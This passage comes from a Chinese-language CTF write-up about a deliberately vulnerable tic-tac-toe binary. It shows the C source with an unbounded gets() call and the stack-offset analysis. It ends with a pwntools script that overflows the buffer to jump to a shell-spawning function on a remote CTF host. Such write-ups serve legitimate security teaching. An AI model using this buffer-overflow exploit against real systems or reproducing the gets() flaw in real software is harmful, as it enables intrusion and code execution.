-</span></span><span class="line"><span class="cl">    <span class="c1">//   fflush(stdin);
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">"You win!!! Tell me your name:"</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="c1">// fgets(s, 1000, stdin);
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">gets</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">"soooooooo cool!"</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">alarm</span><span class="p">(</span><span class="mi">60</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">outputBoard</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">"--------current chessBoard---------"</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">"|"</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">"x"</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">"o"</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">" "</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">"|"</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">"Let's go!!"</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">checkBoard</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">2</span><span class="p">])</span>
-</span></span><span class="line"><span class="cl">        <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="n">i</span><span class="p">])</span>
-</span></span><span class="line"><span class="cl">        <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">2</span><span class="p">])</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">play</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">init</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">srand</span><span class="p">(</span><span class="nf">time</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">rest</span> <span class="o">=</span> <span class="mi">9</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">a</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">isNPC</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">rest</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nf">outputBoard</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">isNPC</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="nf">puts</span><span class="p">(</span><span class="s">"My turn!"</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">p</span> <span class="o">=</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">3</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="nf">puts</span><span class="p">(</span><span class="s">"ooops, I suddenly fall asleep......."</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="n">isNPC</span> <span class="o">^=</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="p">}</span>
-</span></span><span class="line"><span class="cl">            <span class="k">else</span>
-</span></span><span class="line"><span class="cl">            <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="n">isNPC</span> <span class="o">^=</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="n">p</span> <span class="o">=</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="n">rest</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3</span> <span class="o">&amp;&amp;</span> <span class="n">p</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                    <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">3</span> <span class="o">&amp;&amp;</span> <span class="n">p</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                        <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                            <span class="o">--</span><span class="n">p</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                            <span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                            <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                                <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                                <span class="nf">printf</span><span class="p">(</span><span class="s">"I play at (%d, %d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                                <span class="n">rest</span><span class="o">--</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                                <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                            <span class="p">}</span>
-</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">            <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="k">else</span>
-</span></span><span class="line"><span class="cl">        <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="nf">puts</span><span class="p">(</span><span class="s">"Your turn!"</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="nf">puts</span><span class="p">(</span><span class="s">"Please give me a position(0-8):"</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="nf">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pos</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="nf">getchar</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">pos</span> <span class="o">&lt;</span> <span class="mi">9</span> <span class="o">&amp;&amp;</span> <span class="n">pos</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">a</span><span class="p">[</span><span class="n">pos</span> <span class="o">/</span> <span class="mi">3</span><span class="p">][</span><span class="n">pos</span> <span class="o">%</span> <span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="n">a</span><span class="p">[</span><span class="n">pos</span> <span class="o">/</span> <span class="mi">3</span><span class="p">][</span><span class="n">pos</span> <span class="o">%</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="n">rest</span><span class="o">--</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">"You play at: (%d, %d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pos</span> <span class="o">/</span> <span class="mi">3</span><span class="p">,</span> <span class="n">pos</span> <span class="o">%</span> <span class="mi">3</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="p">}</span>
-</span></span><span class="line"><span class="cl">            <span class="k">else</span>
-</span></span><span class="line"><span class="cl">            <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">p</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3</span> <span class="o">&amp;&amp;</span> <span class="n">p</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                    <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                        <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                            <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                            <span class="n">p</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                            <span class="n">rest</span><span class="o">--</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                            <span class="nf">printf</span><span class="p">(</span><span class="s">"Wrong Position! I help you play at: (%d, %d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                            <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">            <span class="p">}</span>
-</span></span><span class="line"><span class="cl">            <span class="n">isNPC</span> <span class="o">^=</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">tmp</span> <span class="o">=</span> <span class="nf">checkBoard</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">"Welcome to ez Tic-Tac-Toe!"</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">play</span><span class="p">())</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">"you loose! Try again!"</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">vulnerable</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><br/>
-<div class="anchor" id="分析二进制文件"></div>
-<h4 class="relative group">分析二进制文件： 
-    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e5%88%86%e6%9e%90%e4%ba%8c%e8%bf%9b%e5%88%b6%e6%96%87%e4%bb%b6" style="text-decoration-line: none !important;">#</a></span>
-</h4>
-<p>(1).将程序拖入IDA中查看反汇编代码</p>
-<p>（也可以自己先利用题目给出的C语言源码搞清楚程序逻辑后再IDA分析）
-可以看到当我们的游戏win时会让我们输入名字，且s字符串的大小只有16，
-
-
-
-
-
-  <figure>
-<img alt="image.png" class="my-0 rounded-md" src="https://s2.loli.net/2023/07/05/Coe29qRdNYGHOUX.png"/>
-</figure>
-</p>
-<p>(2).用鼠标点击变量s，可以查看vulnerable函数的栈，</p>
-<p>
-<figure>
-<img alt="image.png" class="my-0 rounded-md" src="https://s2.loli.net/2023/07/05/2BfOHIVhyrKbnE6.png"/>
-</figure>
-
-
-可以看到 s 的大小为0x14 - 0x4 = 0x10 = 16
-s 离返回地址的距离为0x14 - 0x0 = 20
-由32位栈调用的原理可知在跳到返回地址前函数栈还会pop ebp寄存器，
-所以我们的填充数据段大小为20+4=24，</p>
-<p>(3).最后找到我们要跳转到后门函数（或者是可以get shell）的地址</p>
-<p>
-<figure>
-<img alt="image.png" class="my-0 rounded-md" src="https://s2.loli.net/2023/07/05/noLSy4OtzmeKgaH.png"/>
-</figure>
-
-
-可以看到在地址为 0x08049236 的汇编代码是success函数的开始，所以我们的跳转的返回地址可以为
-0x08049236
-这里的返回地址还可以写0x08049242之前的其他地址：
-0x08049237、0x08049239、0x0804923A、0x0804923D
-但是0x08049242及之后的地址就不行了，因为转到这些地址时函数的get shell 指令就不能完整地执行
-
-
-
-
-
-  <figure>
-<img alt="image.png" class="my-0 rounded-md" src="https://s2.loli.net/2023/07/05/dcF91l8uTe2mYLk.png"/>
-</figure>
-
-
-发送地址时我们用p32()来进行32位的小端打包字节并发送</p>
-<br/>
-<div class="anchor" id="exp"></div>
-<h4 class="relative group">exp： 
-    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#exp" style="text-decoration-line: none !important;">#</a></span>
-</h4>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
-</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">"amd64"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span> <span class="s1">'linux'</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span>
-</span></span><span class="line"><span class="cl"><span class="n">taolve</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'ctf.w4terdr0p.team'</span><span class="p">,</span> <span class="mi">26539</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#taolve = process('./0')</span>
-</span></span><span class="line"><span class="cl"><span class="s1">'''
-</span></span></span><span class="line"><span class="cl"><span class="s1">填充字符
-</span></span></span><span class="line"><span class="cl"><span class="s1">'''</span>
-</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">24</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#填充字符的长度</span>
-</span></span><span class="line"><span class="cl"><span class="n">ret_adrr</span><span class="o">=</span><span class="mh">0x08049236</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="n">offset</span>  <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_adrr</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#我们要修改为的返回地址</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'Please give me a position(0-8):'</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">'1'</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'Please give me a position(0-8):'</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">'1'</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#填一个不合理的数字让电脑帮我们下棋（）</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#实际执行时发现我们随便填一个数字其实最后都是有可能win的，一次没win就两次（）</span>
-</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'Please give me a position(0-8):'</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">'1'</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'Tell me your name:</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">taolve</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#最后转到交互模式后还需要使用linux命令行来得到flag</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#ls 指令来查看当前目录下有哪些文件和文件夹</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#cat flag 来打印 flag</span>
-</span></span><span class="line"><span class="cl"><span class="s1">'''
-</span></span></span><span class="line"><span class="cl"><span class="s1">如果出现下面这句话：
-</span></span></span><span class="line"><span class="cl"><span class="s1">[*] Got EOF while reading in interactive
-</span></span></span><span class="line"><span class="cl"><span class="s1">则说明可能之前的栈溢出填充字符的长度计算错误，
-</span></span></span><span class="line"><span class="cl"><span class="s1">或者是我们所填写的返回地址有错误，
-</span></span></span><span class="line"><span class="cl"><span class="s1">比如未完成之前的必要汇编指令就强行执行一些指令
-</span></span></span><span class="line"><span class="cl"><span class="s1">'''</span>
-</span></span></code></pre></div><p>
-<figure>
-<img alt="image.png" class="my-0 rounded-md" src="https://s2.loli.net/2023/07/05/E1VcBMJg4zmoXpF.png"/>
-</figure>
-</p>
-<br/>
-<hr/>
-<div class="anchor" id="3-pwntools的基本使用"></div>
-<h3 class="relative group">3. pwntools的基本使用 
